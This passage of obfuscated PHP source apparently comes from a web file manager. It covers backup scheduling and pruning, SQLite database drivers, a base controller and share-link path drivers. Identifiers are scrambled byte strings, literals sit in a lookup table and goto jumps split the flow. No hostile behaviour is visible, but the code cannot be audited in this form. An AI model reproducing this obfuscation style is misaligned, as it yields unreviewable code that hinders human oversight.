=> 0), $Ñµ·µøÂ[758] => array($Ñµ·µøÂ[745] => 0, $Ñµ·µøÂ[754] => 0, $Ñµ·µøÂ[755] => 0, $Ñµ·µøÂ[756] => 0, $Ñµ·µøÂ[757] => 0), $Ñµ·µøÂ[200] => array($Ñµ·µøÂ[745] => 0, $Ñµ·µøÂ[759] => 0, $Ñµ·µøÂ[760] => 0, $Ñµ·µøÂ[761] => 0, $Ñµ·µøÂ[762] => 0, $Ñµ·µøÂ[468] => $Ç•á“Ğ, $Ñµ·µøÂ[756] => 0, $Ñµ·µøÂ[757] => 0)), $Ñµ·µøÂ[756] => time(), $Ñµ·µøÂ[757] => 0); $ü¨€¦è‘ = Model($Ñµ·µøÂ[744])->insert($ìËÙƒ); $ìËÙƒ[$Ñµ·µøÂ[399]] = $ü¨€¦è‘; return $ìËÙƒ; } private function checkStore($İ©©¸»÷) { $ù¼’Íì =& $_SERVER[ì™ı‰º¯]; $¹ŞíÆî = Model($ù¼’Íì[763])->listData($İ©©¸»÷); Model($ù¼’Íì[763])->checkConfig($¹ŞíÆî); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ì™ı‰º¯][744])->findByName(self::$name); } return self::$option; } public static function set($‰Ú’‡Ò“) { $®ê¥õÑÙ =& $_SERVER[ì™ı‰º¯]; $›œüî„ˆ = self::get(); foreach ($‰Ú’‡Ò“ as $æ§™õü× => $Õª‚) { $“½‘…Êë = explode($®ê¥õÑÙ[10], $æ§™õü×); $î¨Û‰Ö‚ = count($“½‘…Êë); switch ($î¨Û‰Ö‚) { case 1: $›œüî„ˆ[$“½‘…Êë[0]] = $Õª‚; break; case 2: $›œüî„ˆ[$“½‘…Êë[0]][$“½‘…Êë[1]] = $Õª‚; break; case 3: $›œüî„ˆ[$“½‘…Êë[0]][$“½‘…Êë[1]][$“½‘…Êë[2]] = $Õª‚; break; } } Model($®ê¥õÑÙ[744])->update($›œüî„ˆ[$®ê¥õÑÙ[399]], $›œüî„ˆ); self::$option = $›œüî„ˆ; return self::$option; } public function keep() { $ÙŞ±Ë«© =& $_SERVER[ì™ı‰º¯]; $ÀøĞ­©± = self::get(); if ($ÀøĞ­©±[$ÙŞ±Ë«©[293]][$ÙŞ±Ë«©[752]][$ÙŞ±Ë«©[745]] == $ÙŞ±Ë«©[88]) { return; } $this->backupKeep($ÀøĞ­©±); self::set(array($ÙŞ±Ë«©[764] => 1)); } private function backupKeep($öŒ‘óÚÄ) { $ùŞšÈõ× =& $_SERVER[ì™ı‰º¯]; if (self::$manual == 1) { return; } $úÓÊèæş = Model($ùŞšÈõ×[744])->listData(); if (empty($úÓÊèæş)) { return; } $­ù‹­Ù = 0; $ËÖèàÂ = array(); foreach ($úÓÊèæş as $…êüØ‘•) { if ($­ù‹­Ù >= 7) { break; } $ËÖèàÂ[] = $…êüØ‘•[$ùŞšÈõ×[32]]; $­ù‹­Ù++; } for ($­ù‹­Ù = 0; $­ù‹­Ù < 12; $­ù‹­Ù++) { $ËÖèàÂ[] = date($ùŞšÈõ×[765], strtotime("\55{$­ù‹­Ù}\x20\155\157\x6e\x74\150\163")); } $ËÖèàÂ = array_unique($ËÖèàÂ); $œî©ßš = Model($ùŞšÈõ×[766])->get($ùŞšÈõ×[767]); foreach ($úÓÊèæş as $…êüØ‘•) { if (isset($…êüØ‘•[$ùŞšÈõ×[751]]) && $…êüØ‘•[$ùŞšÈõ×[751]] == $ùŞšÈõ×[88]) { continue; } if (!empty($…êüØ‘•[$ùŞšÈõ×[32]]) && in_array($…êüØ‘•[$ùŞšÈõ×[32]], $ËÖèàÂ)) { continue; } Model($ùŞšÈõ×[744])->remove($…êüØ‘•[$ùŞšÈõ×[399]]); $Ô„úÎµ’ = $this->backupPath($öŒ‘óÚÄ, $œî©ßš); IO::remove($Ô„úÎµ’, !1); } } private function backupPath($˜“ø¦¡´, $ÍğÒºš¾ = false) { $İ²­ã’’ =& $_SERVER[ì™ı‰º¯]; if (!$ÍğÒºš¾) { $ÍğÒºš¾ = Model($İ²­ã’’[766])->get($İ²­ã’’[767]); } $İŞä˜áÉ = $˜“ø¦¡´[$İ²­ã’’[32]]; $ğÆŸ‹™Ï = substr(md5($İ²­ã’’[768] . $ÍğÒºš¾ . $İŞä˜áÉ), 0, 8); return "\173\151\157\72{$˜“ø¦¡´[$İ²­ã’’[747]]}\x7d\x2f\144\x61\x74\x61\142\141\x73\x65\x2f\142\x61\x63\153\x75\x70\57" . $İŞä˜áÉ . $İ²­ã’’[11] . $ğÆŸ‹™Ï; } public function db() { $©ÒŸ¢ƒÙ =& $_SERVER[ì™ı‰º¯]; $ ù¼òÄÅ = self::get(); if ($ ù¼òÄÅ[$©ÒŸ¢ƒÙ[293]][$©ÒŸ¢ƒÙ[753]][$©ÒŸ¢ƒÙ[745]] == $©ÒŸ¢ƒÙ[88]) { return !0; } $•şñÙŠü = new BackupDb(); if (!$•şñÙŠü->index()) { return !1; } self::set(array($©ÒŸ¢ƒÙ[769] => 1)); return !0; } public function dbFile() { $µàñÙº =& $_SERVER[ì™ı‰º¯]; $’×ÚŞäì = self::get(); if ($’×ÚŞäì[$µàñÙº[293]][$µàñÙº[758]][$µàñÙº[745]] == $µàñÙº[88]) { return !0; } $ª´ôƒ¦ô = new BackupDbFile(); if (!$ª´ôƒ¦ô->index()) { return !1; } self::set(array($µàñÙº[770] => 1)); return !0; } public function file() { $‘ş±¥™× =& $_SERVER[ì™ı‰º¯]; $ç˜ìŸ¥ñ = self::get(); if ($ç˜ìŸ¥ñ[$‘ş±¥™×[293]][$‘ş±¥™×[200]][$‘ş±¥™×[745]] == $‘ş±¥™×[88]) { return !0; } if (!isset($ç˜ìŸ¥ñ[$‘ş±¥™×[750]]) || $ç˜ìŸ¥ñ[$‘ş±¥™×[750]] == $‘ş±¥™×[198]) { $ŠÓûÒóÛ = new BackupFile(); if (!$ŠÓûÒóÛ->index()) { return !1; } } self::set(array($‘ş±¥™×[771] => 1, $‘ş±¥™×[745] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $­ÑÎµáÂ =& $_SERVER[ì™ı‰º¯]; $¨™¼øÖ = Backup::get(); self::$io = $¨™¼øÖ[$­ÑÎµáÂ[747]]; self::$name = $¨™¼øÖ[$­ÑÎµáÂ[32]]; $¢‰µŸ¤ = new DbManage(); $íéÔ°áñ = $¢‰µŸ¤->dbType(); $¶·¯ô’Ÿ = array($­ÑÎµáÂ[772] => $íéÔ°áñ, $­ÑÎµáÂ[773] => time()); Backup::set($¶·¯ô’Ÿ); $ÔŠ · = $this->tmpFilesPath() . $­ÑÎµáÂ[774] . self::$name . $­ÑÎµáÂ[8]; del_dir($ÔŠ ·); mk_dir($ÔŠ ·); $Î„¹­•è = $æ‘¶…í = 0; $Éªá”èÇ = new Task($­ÑÎµáÂ[775], $­ÑÎµáÂ[776], 0, LNG($­ÑÎµáÂ[777]) . $­ÑÎµáÂ[778] . LNG($­ÑÎµáÂ[779])); try { $åÔ¸ÉŠç = $¢‰µŸ¤->db()->getTables(); } catch (Exception $Ö…§ıóª) { $Éªá”èÇ->end(); return !1; } $åÔ¸ÉŠç = array_diff($åÔ¸ÉŠç, array($­ÑÎµáÂ[780], $­ÑÎµáÂ[781])); foreach ($åÔ¸ÉŠç as $ÄÇÍÔı) { $Î„¹­•è += $¢‰µŸ¤->model($ÄÇÍÔı)->count(); } $Éªá”èÇ->task[$­ÑÎµáÂ[782]] = $Î„¹­•è; $GLOBALS[$­ÑÎµáÂ[783]] = self::$name; foreach ($åÔ¸ÉŠç as $ÄÇÍÔı) { $Å¸œ = $ÔŠ · . $ÄÇÍÔı . $­ÑÎµáÂ[784]; $ô…¯ø÷Ì = null; if ($ÄÇÍÔı == $­ÑÎµáÂ[785] && (!isset($¨™¼øÖ[$­ÑÎµáÂ[750]]) || $¨™¼øÖ[$­ÑÎµáÂ[750]] == $­ÑÎµáÂ[198])) { $ô…¯ø÷Ì = self::$io; } $æ‘¶…í += $¢‰µŸ¤->sqlFromDb($ÄÇÍÔı, $Å¸œ, $Éªá”èÇ, $ô…¯ø÷Ì); } unset($GLOBALS[$­ÑÎµáÂ[783]]); $Éªá”èÇ->end(); if ($æ‘¶…í > $Î„¹­•è) { $Î„¹­•è = $æ‘¶…í; } $¶·¯ô’Ÿ = array($­ÑÎµáÂ[772] => $íéÔ°áñ, $­ÑÎµáÂ[769] => 1, $­ÑÎµáÂ[786] => $Î„¹­•è, $­ÑÎµáÂ[787] => $æ‘¶…í, $­ÑÎµáÂ[788] => time()); Backup::set($¶·¯ô’Ÿ); if ($Î„¹­•è - $æ‘¶…í > 0) { $‘¿•Æ‡£ = $­ÑÎµáÂ[789]; if (stristr(I18n::getType(), $­ÑÎµáÂ[790])) { $‘¿•Æ‡£ = $­ÑÎµáÂ[791]; } write_log(array($‘¿•Æ‡£, $¶·¯ô’Ÿ), $­ÑÎµáÂ[776]); return !1; } return !0; } private function tmpFilesPath() { $ı·ÜÅ =& $_SERVER[ì™ı‰º¯]; $á€ŠñÙø = TEMP_FILES; if ($GLOBALS[$ı·ÜÅ[6]][$ı·ÜÅ[89]][$ı·ÜÅ[792]]) { $á€ŠñÙø = $GLOBALS[$ı·ÜÅ[6]][$ı·ÜÅ[89]][$ı·ÜÅ[792]]; if (!mk_dir($á€ŠñÙø) || !is_writable($á€ŠñÙø) || !IO::mkfile($á€ŠñÙø . $ı·ÜÅ[793])) { $á€ŠñÙø = TEMP_FILES; } } return $á€ŠñÙø; } } goto EŒÊ¢¶ÈÇº; CË»ÄÁ´–¦: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ıíõÊõ =& $_SERVER[ì™ı‰º¯]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ıíõÊõ[6]] =& $config; $this->values[$ıíõÊõ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ıíõÊõ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ëçî ™À) { if (1 === func_num_args()) { $this->{$Ëçî ™À} = new $Ëçî ™À(); } else { $·«—˜Åˆ = new ReflectionClass($Ëçî ™À); $ÜÜê˜Õş = func_get_args(); array_shift($ÜÜê˜Õş); $this->{$Ëçî ™À} = $·«—˜Åˆ->newInstanceArgs($ÜÜê˜Õş); } return $this->{$Ëçî ™À}; } public function routeBind($©ÃğÙÒü, $¥¹Üé’ò, $ßß«À¤„ = 3) { $œ„ÅòõÓ =& $_SERVER[ì™ı‰º¯]; $¯•Ó  ‡ = $this->in[$œ„ÅòõÓ[9]]; $©ÃğÙÒü = str_replace($œ„ÅòõÓ[10], $œ„ÅòõÓ[11], trim(trim($©ÃğÙÒü, $œ„ÅòõÓ[8]), $œ„ÅòõÓ[12])); if (!$©ÃğÙÒü || count($¯•Ó  ‡) <= $ßß«À¤„) { return !1; } $‹Ëèİ’İ = !0; $‘šŒ¬ß“ = explode($œ„ÅòõÓ[8], $©ÃğÙÒü); for ($ê‚Æ’Ó = 0; $ê‚Æ’Ó < count($‘šŒ¬ß“); $ê‚Æ’Ó++) { if ($‘šŒ¬ß“[$ê‚Æ’Ó] != $¯•Ó  ‡[$ßß«À¤„ + $ê‚Æ’Ó]) { $‹Ëèİ’İ = !1; break; } } if (!$‹Ëèİ’İ) { return; } call_user_func_array(array($this, $¥¹Üé’ò), array()); } public function routeArgs($×Â“ï—Á = 3) { $ÂşùÈâ¯ = $this->in[$_SERVER[ì™ı‰º¯][9]]; if (count($ÂşùÈâ¯) <= $×Â“ï—Á) { return array(); } $Øî¹ ºÓ = array(); for ($®ö­ªãú = $×Â“ï—Á; $®ö­ªãú < count($ÂşùÈâ¯); $®ö­ªãú += 2) { $Øî¹ ºÓ[$ÂşùÈâ¯[$®ö­ªãú]] = $ÂşùÈâ¯[$®ö­ªãú + 1]; $this->in[$ÂşùÈâ¯[$®ö­ªãú]] = $ÂşùÈâ¯[$®ö­ªãú + 1]; } return $Øî¹ ºÓ; } protected function assign($Ç©‡Á…Ç, $Á¶‘µ™¾) { $this->values[$Ç©‡Á…Ç] = $Á¶‘µ™¾; } protected function display($˜¼¸ç°Â) { ob_end_clean(); extract($this->values); require $this->tpl . $˜¼¸ç°Â; } } class DbSqliteBase extends Db { public function __construct($Ç­¬ÒÆ  = '') { $¶Å¬Ø¶‚ =& $_SERVER[ì™ı‰º¯]; if (!extension_loaded($¶Å¬Ø¶‚[13])) { think_exception(think_lang($¶Å¬Ø¶‚[14]) . $¶Å¬Ø¶‚[15]); } if (!empty($Ç­¬ÒÆ )) { if (!isset($Ç­¬ÒÆ [$¶Å¬Ø¶‚[16]])) { $Ç­¬ÒÆ [$¶Å¬Ø¶‚[16]] = 438; } $this->config = $Ç­¬ÒÆ ; if (empty($this->config[$¶Å¬Ø¶‚[17]])) { $this->config[$¶Å¬Ø¶‚[17]] = array(); } } } public function connect($„‘¢Ä‘ˆ = '', $ûÇçƒ‡ä = 0) { $ÄÒÉş‘£ =& $_SERVER[ì™ı‰º¯]; if (!isset($this->linkID[$ûÇçƒ‡ä])) { if (empty($„‘¢Ä‘ˆ)) { $„‘¢Ä‘ˆ = $this->config; } $œú±æ’À = !empty($„‘¢Ä‘ˆ[$ÄÒÉş‘£[17]][$ÄÒÉş‘£[18]]) ? $„‘¢Ä‘ˆ[$ÄÒÉş‘£[17]][$ÄÒÉş‘£[18]] : $this->pconnect; $É„¶ƒú² = $œú±æ’À ? $ÄÒÉş‘£[19] : $ÄÒÉş‘£[20]; $this->linkID[$ûÇçƒ‡ä] = $É„¶ƒú²($„‘¢Ä‘ˆ[$ÄÒÉş‘£[21]], $„‘¢Ä‘ˆ[$ÄÒÉş‘£[16]]); if (!$this->linkID[$ûÇçƒ‡ä]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ûÇçƒ‡ä], 30000); if (1 != think_config($ÄÒÉş‘£[22])) { unset($this->config); } } return $this->linkID[$ûÇçƒ‡ä]; } public function free() { $this->queryID = null; } public function query($ğã‹İÎÄ) { $´¯ûòõï =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğã‹İÎÄ; if ($this->queryID) { $this->free(); } think_action_status($´¯ûòõï[23], 1); think_status($´¯ûòõï[24]); $this->queryID = sqlite_query($this->_linkID, $ğã‹İÎÄ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ùš«‰Œ = $this->getAll(); return $Ùš«‰Œ; } } public function execute($ÎÜÎËå…) { $÷Í ÁÓ¾ =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÎÜÎËå…; if ($this->queryID) { $this->free(); } think_action_status($÷Í ÁÓ¾[25], 1); think_status($÷Í ÁÓ¾[24]); $½°ÜŸŒä = sqlite_exec($this->_linkID, $ÎÜÎËå…); $this->debug(); if (!1 === $½°ÜŸŒä) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ì™ı‰º¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $±ºú¯® = sqlite_query($this->_linkID, $_SERVER[ì™ı‰º¯][27]); if (!$±ºú¯®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯İå‰ß = sqlite_query($this->_linkID, $_SERVER[ì™ı‰º¯][28]); if (!$¯İå‰ß) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ï›²µØ‹ = array(); if ($this->numRows > 0) { for ($ÈƒõÙß = 0; $ÈƒõÙß < $this->numRows; $ÈƒõÙß++) { $ï›²µØ‹[$ÈƒõÙß] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ï›²µØ‹; } public function getFields($±ñ´ÙôŠ) { $ıŞ‚¾´² =& $_SERVER[ì™ı‰º¯]; $õí ÈÂ‡ = $this->query($ıŞ‚¾´²[29] . $±ñ´ÙôŠ . $ıŞ‚¾´²[30]); $Áˆƒòßì = array(); if ($õí ÈÂ‡) { foreach ($õí ÈÂ‡ as $Ì¹°ÄÂ => $ªÅ®‹™®) { $Áˆƒòßì[$ªÅ®‹™®[$ıŞ‚¾´²[31]]] = array($ıŞ‚¾´²[32] => $ªÅ®‹™®[$ıŞ‚¾´²[31]], $ıŞ‚¾´²[33] => $ªÅ®‹™®[$ıŞ‚¾´²[34]], $ıŞ‚¾´²[35] => (bool) ($ªÅ®‹™®[$ıŞ‚¾´²[36]] === $ıŞ‚¾´²[12]), $ıŞ‚¾´²[37] => $ªÅ®‹™®[$ıŞ‚¾´²[38]], $ıŞ‚¾´²[39] => strtolower($ªÅ®‹™®[$ıŞ‚¾´²[40]]) == $ıŞ‚¾´²[41], $ıŞ‚¾´²[42] => strtolower($ªÅ®‹™®[$ıŞ‚¾´²[43]]) == $ıŞ‚¾´²[44]); } } return $Áˆƒòßì; } public function getTables($ïÆß¬ñ© = '') { $›¦„—¸æ =& $_SERVER[ì™ı‰º¯]; $§ê»¼å = $this->query($›¦„—¸æ[45] . $›¦„—¸æ[46] . $›¦„—¸æ[47]); $Á„¬ˆÛ = array(); foreach ($§ê»¼å as $ÁÖ¡œ³¦ => $‘¹ÖÍŞ) { $Á„¬ˆÛ[$ÁÖ¡œ³¦] = current($‘¹ÖÍŞ); } return $Á„¬ˆÛ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $·©ˆŠã‹ =& $_SERVER[ì™ı‰º¯]; $™ùÃÚäĞ = sqlite_last_error($this->_linkID); $this->error = $™ùÃÚäĞ . $·©ˆŠã‹[4] . sqlite_error_string($™ùÃÚäĞ); if ($·©ˆŠã‹[12] != $this->queryStr) { $this->error .= LNG($·©ˆŠã‹[48]) . $this->queryStr; } think_trace($this->error, $·©ˆŠã‹[12], $·©ˆŠã‹[49]); return $this->error; } public function escapeString($×„Òµ±á) { return sqlite_escape_string($×„Òµ±á); } public function parseLimit($èÍÙ„†) { $Õã‹é¨ =& $_SERVER[ì™ı‰º¯]; $ÁŞêøí = $Õã‹é¨[12]; if (!empty($èÍÙ„†)) { $èÍÙ„† = explode($Õã‹é¨[50], $èÍÙ„†); if (count($èÍÙ„†) > 1) { $ÁŞêøí .= $Õã‹é¨[51] . $èÍÙ„†[1] . $Õã‹é¨[52] . $èÍÙ„†[0] . $Õã‹é¨[53]; } else { $ÁŞêøí .= $Õã‹é¨[51] . $èÍÙ„†[0] . $Õã‹é¨[53]; } } return $ÁŞêøí; } } class DbSqlite3Base extends Db { public function __construct($¡ç´”°à = '') { $ìĞø’âÖ =& $_SERVER[ì™ı‰º¯]; if (!class_exists($ìĞø’âÖ[54])) { think_exception(think_lang($ìĞø’âÖ[14]) . $ìĞø’âÖ[55]); } if (!empty($¡ç´”°à)) { if (!isset($¡ç´”°à[$ìĞø’âÖ[16]])) { $¡ç´”°à[$ìĞø’âÖ[16]] = 438; } $this->config = $¡ç´”°à; if (empty($this->config[$ìĞø’âÖ[17]])) { $this->config[$ìĞø’âÖ[17]] = array(); } } } public function connect($á®„ŒÕ = '', $€”á…Ÿ = 0) { $ÎÀ¦Ÿ® =& $_SERVER[ì™ı‰º¯]; if (!isset($this->linkID[$€”á…Ÿ])) { if (empty($á®„ŒÕ)) { $á®„ŒÕ = $this->config; } $this->linkID[$€”á…Ÿ] = new SQLite3($á®„ŒÕ[$ÎÀ¦Ÿ®[21]]); if (!$this->linkID[$€”á…Ÿ]) { think_exception($this->linkID[$€”á…Ÿ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$€”á…Ÿ]->busyTimeout(30000); if (1 != think_config($ÎÀ¦Ÿ®[22])) { unset($this->config); } } return $this->linkID[$€”á…Ÿ]; } public function free() { $this->queryID = null; } public function query($­í¼‡õÄ) { $£­ç”  =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $­í¼‡õÄ; if ($this->queryID) { $this->free(); } think_action_status($£­ç” [23], 1); think_status($£­ç” [24]); $this->queryID = $this->_linkID->query($­í¼‡õÄ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÉÀ¢”Èñ = $this->getAll(); $this->numRows = count($ÉÀ¢”Èñ); return $ÉÀ¢”Èñ; } } public function execute($î«“ÒèÍ) { $“ì¹Ğî¼ =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $î«“ÒèÍ; if ($this->queryID) { $this->free(); } think_action_status($“ì¹Ğî¼[25], 1); think_status($“ì¹Ğî¼[24]); $Ö»œïœÎ = $this->_linkID->exec($î«“ÒèÍ); $this->debug(); if (!1 === $Ö»œïœÎ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ì™ı‰º¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Âî†ğÖ– = $this->_linkID->query($_SERVER[ì™ı‰º¯][27]); if (!$Âî†ğÖ–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ø—¶å…¿ = $this->_linkID->query($_SERVER[ì™ı‰º¯][28]); if (!$Ø—¶å…¿) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Û¿·”¡ = array(); while ($öÙìŠ†ˆ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Û¿·”¡[] = $öÙìŠ†ˆ; } $this->queryID->reset(); return $Û¿·”¡; } public function getFields($‚æ‘°á›) { $€ß÷›İ =& $_SERVER[ì™ı‰º¯]; $–¢¡´â› = $this->query($€ß÷›İ[29] . $‚æ‘°á› . $€ß÷›İ[30]); $²³¤¬¾¦ = array(); if ($–¢¡´â›) { foreach ($–¢¡´â› as $—œÆÍÓû => $¥˜®º­â) { $²³¤¬¾¦[$¥˜®º­â[$€ß÷›İ[32]]] = array($€ß÷›İ[32] => $¥˜®º­â[$€ß÷›İ[32]], $€ß÷›İ[33] => $¥˜®º­â[$€ß÷›İ[33]], $€ß÷›İ[35] => (bool) ($¥˜®º­â[$€ß÷›İ[35]] === $€ß÷›İ[12]), $€ß÷›İ[37] => $¥˜®º­â[$€ß÷›İ[56]], $€ß÷›İ[39] => (bool) $¥˜®º­â[$€ß÷›İ[57]], $€ß÷›İ[42] => (bool) $¥˜®º­â[$€ß÷›İ[57]]); } } return $²³¤¬¾¦; } public function getTables($İ¹ş§¥ = '') { $©ä•ó =& $_SERVER[ì™ı‰º¯]; $ù¨ Æ¹ò = $this->query($©ä•ó[45] . $©ä•ó[46] . $©ä•ó[47]); $¡‚´«¿® = array(); foreach ($ù¨ Æ¹ò as $¥„ã·í => $‚çò¨Ñª) { $¡‚´«¿®[$¥„ã·í] = current($‚çò¨Ñª); } return $¡‚´«¿®; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $áŒÓ‚í• =& $_SERVER[ì™ı‰º¯]; $this->error = $this->_linkID->lastErrorMsg(); if ($áŒÓ‚í•[12] != $this->queryStr) { $this->error .= LNG($áŒÓ‚í•[48]) . $this->queryStr; } think_trace($this->error, $áŒÓ‚í•[12], $áŒÓ‚í•[49]); return $this->error; } public function escapeString($ÄÂê½çê) { $²±›Ä¤ï =& $_SERVER[ì™ı‰º¯]; if ($this->_linkID) { return $this->_linkID->escapeString($ÄÂê½çê); } return str_ireplace($²±›Ä¤ï[58], $²±›Ä¤ï[59], $ÄÂê½çê); } public function parseLimit($¬ğÂŞáÜ) { $å”ÓÜ±ß =& $_SERVER[ì™ı‰º¯]; $í¦¿óã² = $å”ÓÜ±ß[12]; if (!empty($¬ğÂŞáÜ)) { $¬ğÂŞáÜ = explode($å”ÓÜ±ß[50], $¬ğÂŞáÜ); if (count($¬ğÂŞáÜ) > 1) { $í¦¿óã² .= $å”ÓÜ±ß[51] . $¬ğÂŞáÜ[1] . $å”ÓÜ±ß[52] . $¬ğÂŞáÜ[0] . $å”ÓÜ±ß[53]; } else { $í¦¿óã² .= $å”ÓÜ±ß[51] . $¬ğÂŞáÜ[0] . $å”ÓÜ±ß[53]; } } return $í¦¿óã²; } } goto eÊÙ¸²ƒìä; E–Øó„ƒœ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ óäªµÉ) { $this->pathParse = $ óäªµÉ; $this->model = Model($_SERVER[ì™ı‰º¯][1338]); } protected function infoParse($Ú’Æ¬¡, $ƒ›²ñŒŞ = false, $ºªú­ë = false) { $Êµîş£™ =& $_SERVER[ì™ı‰º¯]; return Action($Êµîş£™[1173])->sharePathInfo($this->pathParse[$Êµîş£™[84]], !0, $ƒ›²ñŒŞ); } public function listPath($±‚¼Õ°Ü, $úšİüÎã = false) { $³·‘“• =& $_SERVER[ì™ı‰º¯]; $´€¡Óı = parent::listPath($±‚¼Õ°Ü, $úšİüÎã); if (!$´€¡Óı) { return $´€¡Óı; } if (is_array($´€¡Óı[$³·‘“•[1347]])) { $´€¡Óı[$³·‘“•[1347]] = Action($³·‘“•[1173])->shareItemInfo($´€¡Óı[$³·‘“•[1347]]); } foreach ($´€¡Óı as $ö‚×È’ => $â°²ÔÉˆ) { if (!in_array($ö‚×È’, array($³·‘“•[83], $³·‘“•[82]))) { continue; } foreach ($â°²ÔÉˆ as $øëËı => $ŞÛœÛœƒ) { $´€¡Óı[$ö‚×È’][$øëËı] = Action($³·‘“•[1173])->shareItemInfo($ŞÛœÛœƒ); } } return $´€¡Óı; } public function listAll($Ïı°†½®) { $¶ñÇÒÀô =& $_SERVER[ì™ı‰º¯]; $›÷úÔç = IO::info($this->pathParse[$¶ñÇÒÀô[84]]); if (!$›÷úÔç) { return array(); } $¢¤ˆ°¢ = $this->model->listAll($Ïı°†½®); foreach ($¢¤ˆ°¢ as &$½ïÜºå‹) { $½ïÜºå‹[$¶ñÇÒÀô[87]] = Action($¶ñÇÒÀô[1173])->shareItemInfo($½ïÜºå‹[$¶ñÇÒÀô[87]]); } unset($½ïÜºå‹); return $¢¤ˆ°¢; } } class PathDriverDriverShareItem { public function __construct($íÙŠ‰£š) { $this->pathParse = $íÙŠ‰£š; } public function __call($‘· Ø¿, $ÃÊ´°©Å) { $şÌ²ˆ® =& $_SERVER[ì™ı‰º¯]; if (method_exists($this, $‘· Ø¿)) { return; } $«×‹ = call_user_func_array(array($şÌ²ˆ®[1348], $‘· Ø¿), $ÃÊ´°©Å); $¦Çá‡× = array($şÌ²ˆ®[1349], $şÌ²ˆ®[1350], $şÌ²ˆ®[1351], $şÌ²ˆ®[1352], $şÌ²ˆ®[546], $şÌ²ˆ®[548], $şÌ²ˆ®[1353], $şÌ²ˆ®[107], $şÌ²ˆ®[1354], $şÌ²ˆ®[1355]); if (in_array($‘· Ø¿, $¦Çá‡×)) { $«×‹ = $this->getPathOuter($«×‹); } return $«×‹; } public function copy($êÅÅæÎ˜, $§¯™±Ë, $üšÑÀº½ = false, $¬¨Ïæßœ = false) { return $this->copyMove($êÅÅæÎ˜, $§¯™±Ë, $üšÑÀº½, $_SERVER[ì™ı‰º¯][546], $¬¨Ïæßœ); } public function move($é›´²Õ¤, $ÂÊŞİ´¶, $¶»Ö¢§ = false, $Õ³éÄï« = false) { return $this->copyMove($é›´²Õ¤, $ÂÊŞİ´¶, $¶»Ö¢§, $_SERVER[ì™ı‰º¯][548], $Õ³éÄï«); } private function copyMove($ÓØ‹ÑÛÜ, $–×©Ô‘, $¥§•ˆ‘», $ŞË ¾, $œÉ¯Ï•³ = false) { $¿šøÂÓ’ =& $_SERVER[ì™ı‰º¯]; $›‰•ö = $–×©Ô‘; $ÆÖ†ƒ×× = IO::driverMake($–×©Ô‘); if ($ÆÖ†ƒ××->pathParse[$¿šøÂÓ’[1150]]) { $–×©Ô‘ = $ÆÖ†ƒ××->pathParse[$¿šøÂÓ’[1150]]; } else { $–×©Ô‘ = $›‰•ö; } $ë»—èµ = IO::copyMove($ÓØ‹ÑÛÜ, $–×©Ô‘, $¥§•ˆ‘», $ŞË ¾, $œÉ¯Ï•³); $ë»—èµ = $this->getPathOuter($ë»—èµ); return $ë»—èµ; } public function pathThis($ìó®Õòú) { return get_path_this($this->pathParse[$_SERVER[ì™ı‰º¯][84]]); } public function pathFather($ÉæÚŠıÖ) { return get_path_father($this->pathParse[$_SERVER[ì™ı‰º¯][84]]); } public function iconvSystem($Í¤¯®ı…) { return $Í¤¯®ı…; } protected function infoParse($Ü½’Ç‘ı, $¹Êñá¼ = false) { $‹ô›¾—ã =& $_SERVER[ì™ı‰º¯]; $´ÕÁ˜Â¨ = $this->pathParse[$‹ô›¾—ã[486]][$‹ô›¾—ã[1174]] . $this->pathParse[$‹ô›¾—ã[1167]]; if ($¹Êñá¼) { $¦ı‘·¹ô = IO::infoWithChildren($´ÕÁ˜Â¨); } else { $¦ı‘·¹ô = IO::info($´ÕÁ˜Â¨); } $»ÌÔó¡Ì = $this->pathParse[$‹ô›¾—ã[486]]; return Action($‹ô›¾—ã[1346])->_shareItemeParse($¦ı‘·¹ô, $»ÌÔó¡Ì); } public function listAll($ûéµÃ¨Â) { $õ Åí”¼ =& $_SERVER[ì™ı‰º¯]; $òû¹¸„Û = IO::listAll($ûéµÃ¨Â); 